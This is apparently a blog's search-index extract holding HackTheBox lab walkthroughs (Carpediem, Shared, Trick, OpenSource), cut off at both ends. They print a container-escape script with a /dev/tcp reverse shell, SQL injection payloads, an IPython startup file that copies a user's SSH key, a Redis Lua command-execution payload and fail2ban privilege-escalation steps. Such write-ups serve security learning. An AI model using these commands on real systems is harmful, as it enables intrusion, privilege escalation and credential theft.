(is_dir($path)) { chdir($path); if ($_verbose_mode) { echo \"cwd changed to: {$path}\\n\"; } } else { echo \"\\nERROR: {$path} not found.\\n\\n\"; } break; default: if (substr($param, 0, 2) == '--') { // ignore unknown options break; } else { // parse the URI $path = parse_url($param); // set site name if (isset($path['host'])) { $_SERVER['HTTP_HOST'] = $path['host']; } // set query string if (isset($path['query'])) { $_SERVER['QUERY_STRING'] = $path['query']; parse_str($path['query'], $_GET); $_REQUEST = $_GET; } // set file to execute or Backdrop path (clean URLs enabled) if (isset($path['path']) \u0026\u0026 file_exists(substr($path['path'], 1))) { $_SERVER['PHP_SELF'] = $_SERVER['REQUEST_URI'] = $","date":"2022-12-03","objectID":"/hackthebox-carpediem/:4:5","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"Escaping the privileged docker container Now for getting root on the main machine and escaping the docker we can read this article. Following the article, I made the following script. mkdir /tmp/privesc mount -t cgroup -o rdma cgroup /tmp/privesc mkdir /tmp/privesc/x echo 1 \u003e /tmp/privesc/x/notify_on_release host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` echo \"$host_path/cmd\" \u003e /tmp/privesc/release_agent echo '#!/bin/bash' \u003e /cmd echo \"bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.46/9001 0\u003e\u00261'\" \u003e\u003e /cmd chmod a+x /cmd bash -c \"echo \\$\\$ \u003e /tmp/privesc/x/cgroup.procs\" Now again start a nc listener on port 9001 and execute the script. But before executing the script, unshare()\rMounting a cgroupfs requires the CAP_SYS_ADMIN capability in the user namespace hosting the current cgroup namespace. By default, containers run without CAP_SYS_ADMIM, and thus cannot mount cgroupfs in the initial user namespace. But through the unshare() syscall, containers can create new user and cgroup namespaces where they possess the CAP_SYS_ADMIN capability and can mount a cgroupfs.\rSource: https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/ root@90c7f522b842:~# unshare -UrmC bash root@90c7f522b842:~# wget http://10.10.14.46/script.sh \u0026\u003e/dev/null \u0026\u0026 chmod +x script.sh \u0026\u0026 ./script.sh And finally we got root. ┌──(kali㉿kali)-[~/…/hackthebox/hackthebox/machines/carpediem] └─$ nc -lvnp 9001 listening on [any] 9001 ... connect to [10.10.14.46] from (UNKNOWN) [10.10.11.167] 35810 root@carpediem:/# whoami root ","date":"2022-12-03","objectID":"/hackthebox-carpediem/:4:6","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"root.txt root@carpediem:/# ls -al ls -al total 72 drwxr-xr-x 19 root root 4096 May 26 14:34 . drwxr-xr-x 19 root root 4096 May 26 14:34 .. lrwxrwxrwx 1 root root 7 Aug 24 2021 bin -\u003e usr/bin drwxr-xr-x 4 root root 4096 Jun 20 12:05 boot drwxr-xr-x 2 root root 4096 Oct 26 2021 cdrom drwxr-xr-x 19 root root 3940 Nov 2 05:23 dev drwxr-xr-x 110 root root 4096 Jun 23 15:55 etc drwxr-xr-x 6 root root 4096 May 26 14:34 home lrwxrwxrwx 1 root root 7 Aug 24 2021 lib -\u003e usr/lib lrwxrwxrwx 1 root root 9 Aug 24 2021 lib32 -\u003e usr/lib32 lrwxrwxrwx 1 root root 9 Aug 24 2021 lib64 -\u003e usr/lib64 lrwxrwxrwx 1 root root 10 Aug 24 2021 libx32 -\u003e usr/libx32 drwx------ 2 root root 16384 Oct 26 2021 lost+found drwxr-xr-x 2 root root 4096 Aug 24 2021 media drwxr-xr-x 2 root root 4096 May 26 14:34 mnt drwxr-xr-x 3 root root 4096 May 26 14:34 opt dr-xr-xr-x 338 root root 0 Nov 2 05:23 proc drwx------ 6 root root 4096 Jun 23 15:54 root drwxr-xr-x 27 root root 880 Nov 2 11:48 run lrwxrwxrwx 1 root root 8 Aug 24 2021 sbin -\u003e usr/sbin drwxr-xr-x 2 root root 4096 May 26 14:34 srv dr-xr-xr-x 13 root root 0 Nov 2 05:23 sys drwxrwxrwt 12 root root 4096 Nov 2 13:35 tmp drwxr-xr-x 14 root root 4096 May 26 13:51 usr drwxr-xr-x 13 root root 4096 May 26 14:34 var root@carpediem:/# cat /root/root.txt cat /root/root.txt 8c****************************c6 root@carpediem:/# Thanks for reading! ","date":"2022-12-03","objectID":"/hackthebox-carpediem/:4:7","tags":["hackthebox","machines"],"title":"HackTheBox - Carpediem","uri":"/hackthebox-carpediem/"},{"categories":["HackTheBox"],"content":"Hackthebox medium machine Shared walkthrough \u0026 tutorial..","date":"2022-11-12","objectID":"/hackthebox-shared/","tags":["hackthebox","machines"],"title":"Hackthebox - Shared","uri":"/hackthebox-shared/"},{"categories":["HackTheBox"],"content":"This post is focused on the walkthrough of Medium Machine Shared from HackTheBox. ","date":"2022-11-12","objectID":"/hackthebox-shared/:0:0","tags":["hackthebox","machines"],"title":"Hackthebox - Shared","uri":"/hackthebox-shared/"},{"categories":["HackTheBox"],"content":"Enumeration Starting out with the initial nmap scan. nmap -A -vv 10.10.11.172 -oN nmapN PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsjcm1tYGyIVXP0ioF03lG4xMs6JWNDImzpWnDFVmg7erh4KRulrJvaR2MGkZ4UeVQFz8jva8xsG8r9ALtST48+wRF9TniLsHcuwvRop3EVEmlImth1cjG1+BHyIwoaf7Z9R5ocRw9r5PGDO8hydQTwGv4n/foMQJOu3WhIsz8532utbYpdiERTIAbB2xtC4eolcDNLJ9LptizWpUS5/Jm5BrpYODb6OIM8rWjZyJqJgehA63kqN5oEMP6eoiW+t95DuZoLPLtH+/Y4GAO5gjYmj+rfRDSYlBXQQ94hk/yxqvfMI/jfIgEPXLuCBaE2WPm+SYDUZ0HsuV70F6dobs+q/SNYT1jjSgQFi6hA1ZpSIjGPBl9aaB+vEF5fQcA+z/nWwfaYMqUu3utQNvi0ejZ3UQgbF6P0pVD/NlbX9jT2cRC3Og3rL2Mhhq7kIXYxS6n1UxNbhYD7PQHs7lhDMIinTj2U8Z1TjFujWWO2VGzarJXtZcFKV2TPfEwilN0yM8= | 256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBljy8WbFpXolV3MJQIZVSUOoLE6xK6KMEF5B1juVK5pOmj3XlfkjDwPbQ5svG18n7lIuaeFMpggTrftBjUWKOk= | 256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIWVTnJGzAgwIazusSrn+ULowTr1vEHVIVQzxj0u2W+y 80/tcp open http syn-ack nginx 1.18.0 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Did not follow redirect to http://shared.htb |_http-server-header: nginx/1.18.0 443/tcp open ssl/http syn-ack nginx 1.18.0 |_http-title: Did not follow redirect to https://shared.htb | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | tls-nextprotoneg: | h2 |_ http/1.1 | ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US/localityName=None | Issuer: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US/localityName=None | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2022-03-20T13:37:14 | Not valid after: 2042-03-15T13:37:14 | MD5: fb0b 4ab4 9ee7 d95d ae43 239a fca4 c59e | SHA-1: 6ccd a103 5d29 a441 0aa2 0e32 79c4 83e1 750a d0a0 | -----BEGIN CERTIFICATE----- | MIIDgTCCAmmgAwIBAgIUfRY/CTV1JRpsij80nJ2qVo8C0sUwDQYJKoZIhvcNAQEL | BQAwUDELMAkGA1UEBhMCVVMxDTALBgNVBAgMBE5vbmUxDTALBgNVBAcMBE5vbmUx | DDAKBgNVBAoMA0hUQjEVMBMGA1UEAwwMKi5zaGFyZWQuaHRiMB4XDTIyMDMyMDEz | MzcxNFoXDTQyMDMxNTEzMzcxNFowUDELMAkGA1UEBhMCVVMxDTALBgNVBAgMBE5v | bmUxDTALBgNVBAcMBE5vbmUxDDAKBgNVBAoMA0hUQjEVMBMGA1UEAwwMKi5zaGFy | ZWQuaHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4vqqZAfqdwC+ | Bt01RMljAzeU+To4hKQ9PjbDuRzVFNEXgpxC3YAYnDsk+J3r9lsnM1UND7gDuCsN | r0Gxb+j5o+T8Qxg6iwn6bR/LgXslpW+laN1EUil2kkINxOCmgNKsGpRBiKl2nzXo | DaMGw0zva7n0FIWH7LBebC6E3Ix37hIrKZqQPUlHh0lZdAWg4WWplVXqMXCbGsnR | tWt3t0XBnbbKn8PnsChlX7eTxh/SMsh6zKNC7s2qoJYJt9fqcm+sVyIeKVR55nQW | obVENYdjJfpXqP+CLE+Y1b9lIEyQ+xRVgzkg7e1trWa0IbM5+gySi0Pk4cM1/W1L | PkmdrH/jeQIDAQABo1MwUTAdBgNVHQ4EFgQUybpz156b8qt/qvfSXeo8TBjan/8w | HwYDVR0jBBgwFoAUybpz156b8qt/qvfSXeo8TBjan/8wDwYDVR0TAQH/BAUwAwEB | /zANBgkqhkiG9w0BAQsFAAOCAQEASF9WK54bYGFb7v92oL4krO+04Qsr+kyuKwwk | lDarRxEdG8b63zf6ug9crDCNmmEQF+XL5TsRyIIBdZheYzZnxmeSueKrRq4oLusb | LWfsU4vvdUkIp+D6mt9RlT/N7U/LgNZSHLR40V71bAt+gjj98cBAqn5XR0WJY/Eu | ecG51FuQe6/7VCKje3tzTZtNtSBleT8Jy3lRkx4pa6GwkY/KiJbXFRqAud8Xdblz | 5mhibkaWk8spaNxc6S6V7xyMC/kjcznfEKHVvocL32kUZfaN8Af9XaVN9UYhecu/ | znFVUvL3buLlMUy7TLdw4bJNJUdFXviq++Gu/n1uER6nSLMwGw== |_-----END CERTIFICATE----- |_ssl-date: TLS randomness does not represent time |_http-server-header: nginx/1.18.0 | tls-alpn: | h2 |_ http/1.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Enumerating the web it is redirecting us to the domain shared.htb so let’s add this to our /etc/hosts file and visit the page again. Website\rFrom the looks of it, it’s a online shopping website where we can add some products to cart and buy them. For checking out the functionality we can buy some stuff and check what it can lead us to. I simply added a product to the cart and proceeded to checkout. Here ","date":"2022-11-12","objectID":"/hackthebox-shared/:1:0","tags":["hackthebox","machines"],"title":"Hackthebox - Shared","uri":"/hackthebox-shared/"},{"categories":["HackTheBox"],"content":"Foothold Assuming there are columns username and password we can extract user information. 'UNION SELECT 1,username, 3 FROM user -- - username\rExtracting the password. 'UNION SELECT 1,password, 3 FROM user -- - password\rWe now have a password hash and a username. Let’s crack the password using john. The hash is MD5. MD5 Hash\rSave the hash in a file. echo \"fc895d4eddc2fc12f995e18c865cf273\" \u003e john.hash Crack the hash. john --format=Raw-MD5 --wordlist=/home/saad/Documents/wordlists/rockyou.txt john.hash Cracked Hash\rLet’s try these creds in ssh. ssh james_mason@shared.htb SSH\rAnd we are in! Checking the id command we are part of a group developer. id\rLooking for files and folders associated with the group developer. find\rVisiting the above folder, it contained no files. /opt/scripts/review\rSince I couldn’t find anything else, I simply ran pspy to monitor the system processes. Monitoring the processes, there are a few processes running with UID=1001. pspy\rSince it’s running ipython I tried looking for vulnerabilities in ipython and came accross the following vulnerability. Security Advisory\rWe’d like to disclose an arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another.\rSource: https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x Following the above article, we can run the below commands in /opt/scripts_review/ directory to extract the ssh private key of user dan_smith. mkdir -m 777 profile_default mkdir -m 777 profile_default/startup echo \"import os; os.system('cat ~/.ssh/id_rsa \u003e /tmp/key')\" \u003e profile_default/startup/foo.py After a while, we can see the key in /tmp directory. RSA Private Key\r","date":"2022-11-12","objectID":"/hackthebox-shared/:2:0","tags":["hackthebox","machines"],"title":"Hackthebox - Shared","uri":"/hackthebox-shared/"},{"categories":["HackTheBox"],"content":"user.txt user.txt\r","date":"2022-11-12","objectID":"/hackthebox-shared/:3:0","tags":["hackthebox","machines"],"title":"Hackthebox - Shared","uri":"/hackthebox-shared/"},{"categories":["HackTheBox"],"content":"Privilege Escalation Again looking at the id command we are part of a new group sysadmin Group sysadmin\rLooking for files and folders of belonging to this group, We found a binary redis_connector_dev. /usr/local/bin/redis_connector_dev\rRunning the binary, I noticed that it is logging to redis using a password. [running redis_connector_dev binary\rRunning the binary locally, it is establishing a connection on port 6379 which is used by redis-cli. running redis_connector_dev binary locally\rI opened port 6379 using nc and ran the binary again. This time it showd some output on the listening end a string which could be the password. nc on port 6379\rLooking for vulnerabilities in redis-cli I came across CVE-2022-0543. With this vulnerability we can execute system commands. You can read about this vulnerability from here. ","date":"2022-11-12","objectID":"/hackthebox-shared/:4:0","tags":["hackthebox","machines"],"title":"Hackthebox - Shared","uri":"/hackthebox-shared/"},{"categories":["HackTheBox"],"content":"root.txt First we need to run redis-cli with the password we found above. Then we enter the following command to retrieve the root flag. eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"cat /root/root.txt\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 root.txt\rThanks for reading! ","date":"2022-11-12","objectID":"/hackthebox-shared/:5:0","tags":["hackthebox","machines"],"title":"Hackthebox - Shared","uri":"/hackthebox-shared/"},{"categories":["HackTheBox"],"content":"HackTheBox easy linux machine Trick walkthrough.","date":"2022-10-29","objectID":"/hackthebox-trick/","tags":["hackthebox","machines"],"title":"HackTheBox - Trick","uri":"/hackthebox-trick/"},{"categories":["HackTheBox"],"content":"This post is focused on the walkthrough of Easy Linux Machine Trick from HackTheBox. ","date":"2022-10-29","objectID":"/hackthebox-trick/:0:0","tags":["hackthebox","machines"],"title":"HackTheBox - Trick","uri":"/hackthebox-trick/"},{"categories":["HackTheBox"],"content":"Summary Trick from HackTheBox is an Easy Linux Machine. We get a subdomain by performing a DNS zone transfer which in turn reveals another subdomain by brute-forcing on the same pattern. The newly discovered website was vulnerable to LFI through which we can read the private ssh key of the user and login to get the user.txt. The current user being able to restart the fail2ban service as root and being part of security group leads to Privilege Escalation by abusing the fail2ban configuration. ","date":"2022-10-29","objectID":"/hackthebox-trick/:1:0","tags":["hackthebox","machines"],"title":"HackTheBox - Trick","uri":"/hackthebox-trick/"},{"categories":["HackTheBox"],"content":"Enumeration Starting out with the initial nmap scan. ┌──(kali㉿kali)-[~/…/hackthebox/hackthebox/machines/Trick] └─$ nmap -A -vv 10.10.11.166 -oN nmapN PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 61:ff:29:3b:36:bd:9d:ac:fb🇩🇪1f:56:88:4c:ae:2d (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5Rh57OmAndXFukHce0Tr4BL8CWC8yACwWdu8VZcBPGuMUH8VkvzqseeC8MYxt5SPL1aJmAsZSgOUreAJNlYNBBKjMoFwyDdArWhqDThlgBf6aqwqMRo3XWIcbQOBkrisgqcPnRKlwh+vqArsj5OAZaUq8zs7Q3elE6HrDnj779JHCc5eba+DR+Cqk1u4JxfC6mGsaNMAXoaRKsAYlwf4Yjhonl6A6MkWszz7t9q5r2bImuYAC0cvgiHJdgLcr0WJh+lV8YIkPyya1vJFp1gN4Pg7I6CmMaiWSMgSem5aVlKmrLMX10MWhewnyuH2ekMFXUKJ8wv4DgifiAIvd6AGR | 256 9e💿f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAoXvyMKuWhQvWx52EFXK9ytX/pGmjZptG8Kb+DOgKcGeBgGPKX3ZpryuGR44av0WnKP0gnRLWk7UCbqY3mxXU0= | 256 72:93:f9:11:58🇩🇪34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGY1WZWn9xuvXhfxFFm82J9eRGNYJ9NnfzECUm0faUXm 25/tcp open smtp syn-ack Postfix smtpd |_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING 53/tcp open domain syn-ack ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux) | dns-nsid: |_ bind.version: 9.11.5-P4-5.1+deb10u7-Debian 80/tcp open http syn-ack nginx 1.14.2 |_http-title: Coming Soon - Start Bootstrap Theme |_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA | http-methods: |_ Supported Methods: GET HEAD |_http-server-header: nginx/1.14.2 Service Info: Host: debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel We have multiple open ports. Enumerating port 80, we get a website. Website\rSince I couldn’t find much here. I tried enumerating port 53 DNS. We can try a zone transfer to get some information. ┌──(kali㉿kali)-[~/…/hackthebox/hackthebox/machines/Trick] └─$ dig axfr @10.10.11.166 trick.htb ; \u003c\u003c\u003e\u003e DiG 9.18.7-1-Debian \u003c\u003c\u003e\u003e axfr @10.10.11.166 trick.htb ; (1 server found) ;; global options: +cmd trick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800 trick.htb. 604800 IN NS trick.htb. trick.htb. 604800 IN A 127.0.0.1 trick.htb. 604800 IN AAAA ::1 preprod-payroll.trick.htb. 604800 IN CNAME trick.htb. trick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800 ;; Query time: 176 msec ;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP) ;; WHEN: Sat Oct 29 02:18:45 EDT 2022 ;; XFR size: 6 records (messages 1, bytes 231) Nice. We get a subdomain preprod-payroll.trick.htb here. Visiting the subdomain after adding it to our /etc/hosts. preprod-production.trick.htb\rDefault credentials didn’t work here but trying for SQLi showed some errors. Login Request\rWe can dig further to get the SQLi. ┌──(kali㉿kali)-[~/…/hackthebox/hackthebox/machines/Trick] └─$ sqlmap -r login.req http://preprod-payroll.trick.htb/ --current-db Using sqlmap we identified the Database is payroll_db. Next we can look for tables in this db. ┌──(kali㉿kali)-[~/…/hackthebox/hackthebox/machines/Trick] └─$ sqlmap -r login.req http://preprod-payroll.trick.htb/ -D payroll_db --tables Tables in payroll_db\rNow for the entries in the users table. ┌──(kali㉿kali)-[~/…/hackthebox/hackthebox/machines/Trick] └─$ sqlmap -r login.req http://preprod-payroll.trick.htb/ -D payroll_db -T users --dump users table\rLogging with these credentials we get the following page. Logged in\rI couldn’t find anything further here so moved on to brute-forcing vhosts. Brute-forcing vhosts we couldn’t find any so we can try brute-forcing with a pattern preprod-\u003csubdomain\u003e.trick.htb We can first use sed command to add a prefix to our wordlist then use wfuzz to brute-force subdomains based on their character count. ┌──(kali㉿kali)-[~/…/hackthebox/hackthebox/machines/Trick] └─$ sed -e 's/^/preprod-/' /home/kali/Documents/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \u003e new","date":"2022-10-29","objectID":"/hackthebox-trick/:2:0","tags":["hackthebox","machines"],"title":"HackTheBox - Trick","uri":"/hackthebox-trick/"},{"categories":["HackTheBox"],"content":"Foothold Looking around we have a page parameter which looks interesting for a LFI. Page Parameter\rBypassing some basic filtering we get the LFI Reading /etc/passwd through LFI\rFrom the /etc/passwd we know there’s a user michael, so we can check for ssh keys in it’s home directory. Reading /home/michael/.ssh/id_rsa\rTry logging in with the id_rsa. ┌──(kali㉿kali)-[~/…/hackthebox/hackthebox/machines/Trick] └─$ ssh -i id_rsa michael@trick.htb michael@trick:~$ whoami michael michael@trick:~$ And we’re in. ","date":"2022-10-29","objectID":"/hackthebox-trick/:3:0","tags":["hackthebox","machines"],"title":"HackTheBox - Trick","uri":"/hackthebox-trick/"},{"categories":["HackTheBox"],"content":"user.txt michael@trick:~$ ls -al total 84 drwxr-xr-x 15 michael michael 4096 Oct 29 08:34 . drwxr-xr-x 3 root root 4096 May 25 13:28 .. lrwxrwxrwx 1 root root 9 Apr 22 2022 .bash_history -\u003e /dev/null -rw-r--r-- 1 michael michael 220 Apr 18 2019 .bash_logout -rw-r--r-- 1 michael michael 3526 Apr 18 2019 .bashrc drwx------ 9 michael michael 4096 May 11 21:09 .cache drwx------ 10 michael michael 4096 May 11 21:08 .config drwxr-xr-x 2 michael michael 4096 May 11 21:07 Desktop drwxr-xr-x 2 michael michael 4096 May 11 21:07 Documents drwxr-xr-x 2 michael michael 4096 May 11 21:07 Downloads drwx------ 3 michael michael 4096 May 11 21:08 .gnupg -rw------- 1 michael michael 1256 May 25 13:09 .ICEauthority drwx------ 3 michael michael 4096 May 11 21:07 .local drwxr-xr-x 2 michael michael 4096 May 11 21:07 Music drwxr-xr-x 2 michael michael 4096 May 11 21:07 Pictures -rw-r--r-- 1 michael michael 807 Apr 18 2019 .profile drwxr-xr-x 2 michael michael 4096 May 11 21:07 Public -rw------- 1 michael michael 86 Oct 29 08:34 .python_history drwx------ 2 michael michael 4096 May 24 17:25 .ssh drwxr-xr-x 2 michael michael 4096 May 11 21:07 Templates -rw-r----- 1 root michael 33 Oct 29 07:52 user.txt drwxr-xr-x 2 michael michael 4096 May 11 21:07 Videos michael@trick:~$ cat user.txt 1a****************************ef michael@trick:~$ ","date":"2022-10-29","objectID":"/hackthebox-trick/:3:1","tags":["hackthebox","machines"],"title":"HackTheBox - Trick","uri":"/hackthebox-trick/"},{"categories":["HackTheBox"],"content":"Privilege Escalation sudo -l shows we can run /etc/init.d/fail2ban restart as root. michael@trick:~$ sudo -l Matching Defaults entries for michael on trick: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User michael may run the following commands on trick: (root) NOPASSWD: /etc/init.d/fail2ban restart michael@trick:~$ fail2ban\rFail2ban is an intrusion prevention software framework. Written in the Python programming language, it is designed to prevent against brute-force attacks. It is able to run on POSIX systems that have an interface to a packet-control system or firewall installed locally, such as iptables or TCP Wrapper.\rSource: https://en.wikipedia.org/wiki/Fail2ban Looking up for PrivEsc using fail2ban I came accross this article. We have almost the same scenario as the above article. We also have ssh service enabled in the /etc/fail2ban/jail.conf file. ssh service enabled in jail.conf\rNow since we can restart fail2ban as root what we have to do now is to inject our custom command as actionban in /etc/fail2ban/action.d/iptables-multiport.conf file. Sadly we don’t have write permissions on the file. /etc/fail2ban/action.d/iptables-multiport.conf permissions\rBut luckily we are part of a group security and this group has write permissions on the /etc/fail2ban/action.d folder. write permissions\rNow the attack scenario is as follows. We will delete the original iptables-multiport.conf file and replace it with our custom made file. Then we will restart the fail2ban service and finally attempt to login via ssh 5 times via brute-forcing or manually. And this will execute our command as actionban. Now changing the iptables-multiport.conf file as follows actionban\rThen deleting the previous one and fetching the new one. Deleting original and fetching new one\rRestarting the fail2ban service. Restart fail2ban\rNow brute-force the ssh login via hydra. Brute-forcing ssh login via hydra\rNow looking at the bash binary, it has the SUID bit set. SUID bash\r","date":"2022-10-29","objectID":"/hackthebox-trick/:4:0","tags":["hackthebox","machines"],"title":"HackTheBox - Trick","uri":"/hackthebox-trick/"},{"categories":["HackTheBox"],"content":"root.txt bash-5.0# cd /root/ bash-5.0# ls -al total 56 drwx------ 8 root root 4096 Jun 7 03:33 . drwxr-xr-x 19 root root 4096 May 25 13:28 .. lrwxrwxrwx 1 root root 9 Apr 22 2022 .bash_history -\u003e /dev/null -rw-r--r-- 1 root root 570 Jan 31 2010 .bashrc drwx------ 2 root root 4096 May 25 13:28 .cache drwx------ 5 root root 4096 May 25 13:28 .config -rw-r--r-- 1 root root 139 Apr 22 2022 f2b.sh drwxr-xr-x 6 root root 4096 Jun 12 01:29 fail2ban drwx------ 3 root root 4096 May 25 13:28 .gnupg drwxr-xr-x 3 root root 4096 May 25 13:28 .local -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw-r----- 1 root root 33 Oct 29 07:52 root.txt -rw-r--r-- 1 root root 66 Jun 7 03:32 .selected_editor -rwxr-xr-x 1 root root 1342 Jun 7 03:33 set_dns.sh drwx------ 2 root root 4096 May 25 13:28 .ssh bash-5.0# cat root.txt 31****************************6c bash-5.0# Thanks for reading! ","date":"2022-10-29","objectID":"/hackthebox-trick/:4:1","tags":["hackthebox","machines"],"title":"HackTheBox - Trick","uri":"/hackthebox-trick/"},{"categories":["HackTheBox"],"content":"HackTheBox easy linux machine OpenSource walkthrough.","date":"2022-10-05","objectID":"/hackthebox-opensource/","tags":["hackthebox","machines"],"title":"HackTheBox - OpenSource","uri":"/hackthebox-opensource/"},{"categories":["HackTheBox"],"content":"This post is focused on the walkthrough of Easy Linux Machine OpenSource from HackTheBox. ","date":"2022-10-05","objectID":"/hackthebox-opensource/:0:0","tags":["hackthebox","machines"],"title":"HackTheBox - OpenSource","uri":"/hackthebox-opensource/"},{"categories":["HackTheBox"],"content":"Summary OpenSource from HackTheBox is an Easy Linux Machine. We get initial foothold on a docker container by overwriting a file and adding a custom route by taking advantage of the insecure usage of os.path.join function. From there we identify an unknown service running on one of the internal servers. We expose that service which leads to another website in which we log in by using the leaked credentials in one of the git commits and finally get the user via a private ssh key on the website. Taking advantage of auto commiting git processes running as root, we manipulate the git hooks and gain shell as root. ","date":"2022-10-05","objectID":"/hackthebox-opensource/:1:0","tags":["hackthebox","machines"],"title":"HackTheBox - OpenSource","uri":"/hackthebox-opensource/"},{"categories":["HackTheBox"],"content":"Enumeration Starting out with the initial nmap scan. ┌──(saad👻ssaadakhtarr)-[~/…/hackthebox/hackthebox/machines/opensource] └─$ nmap -A -vv 10.10.11.164 -oN nmapN PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOm3Ocn3qQzvKFsAf8u2wdkpi0XryPX5W33bER74CfZxc4QPasF+hGBNSaCanZpccGuPffJ9YenksdoTNdf35cvhamsBUq6TD88Cyv9Qs68kWPJD71MkSDgoyMFIe7NTdzyWJJjmUcNHRvwfo6KQsVXjwC4MN+SkL6dLfAY4UawSNhJZGTiKu0snAV6TZ5ZYnmDpnKIEZzf/dOK6bBu4SCu9DRjPknuZkl7sKp3VCoI9CRIu1tihqs1NPhFa+XnHSRsULWtQqtmxZP5UXbmgwETxmpfw8M9XcMH0QXr8JSAdDkg2NtIapmPX/a3hVFATYg+idaEEQNlZHPUKLbCTyJ | 256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLA9ak8TUAPl/F77SPc1ut/8B+eOukyC/0lof4IrqJoPJLYusbXk+9u/OgSGp6bJZhotkJUvhC7k0rsA7WX19Y8= | 256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINxEEb33GC5nT5IJ/YY+yDpTKQGLOK1HPsEzM99H4KKA 80/tcp open http syn-ack Werkzeug/2.1.2 Python/3.10.3 | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: Wed, 06 Jul 2022 15:49:02 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 5316 | Connection: close | \u003chtml lang=\"en\"\u003e | \u003chead\u003e | \u003cmeta charset=\"UTF-8\"\u003e | \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e | \u003ctitle\u003eupcloud - Upload files for Free!\u003c/title\u003e | \u003cscript src=\"/static/vendor/jquery/jquery-3.4.1.min.js\"\u003e\u003c/script\u003e | \u003cscript src=\"/static/vendor/popper/popper.min.js\"\u003e\u003c/script\u003e | \u003cscript src=\"/static/vendor/bootstrap/js/bootstrap.min.js\"\u003e\u003c/script\u003e | \u003cscript src=\"/static/js/ie10-viewport-bug-workaround.js\"\u003e\u003c/script\u003e | \u003clink rel=\"stylesheet\" href=\"/static/vendor/bootstrap/css/bootstrap.css\"/\u003e | \u003clink rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-grid.css\"/\u003e | \u003clink rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-reboot.css\"/\u003e | \u003clink rel= | HTTPOptions: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: Wed, 06 Jul 2022 15:49:02 GMT | Content-Type: text/html; charset=utf-8 | Allow: GET, OPTIONS, HEAD | Content-Length: 0 | Connection: close | RTSPRequest: | \u003c!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" | 